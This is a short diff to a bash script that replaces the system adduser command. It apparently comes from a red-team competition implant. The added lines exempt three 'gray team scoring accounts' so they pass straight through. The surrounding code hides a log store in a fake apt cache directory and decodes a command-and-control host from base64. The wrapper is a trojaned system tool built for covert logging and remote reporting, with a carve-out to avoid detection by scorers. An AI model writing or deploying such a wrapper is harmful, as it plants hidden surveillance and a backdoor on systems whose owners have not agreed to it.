@@ -1,6 +1,12 @@
 #!/bin/bash
 
 REAL_ADDUSER="/usr/sbin/adduser"
+
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_ADDUSER "$@" ;;
+esac
+
 LOG_DIR="/var/lib/apt/lists/.cache"
 LOCAL_LOG="${LOG_DIR}/events"
 C2_HOST=$(printf "%s" "__ENC__" | base64 -d)
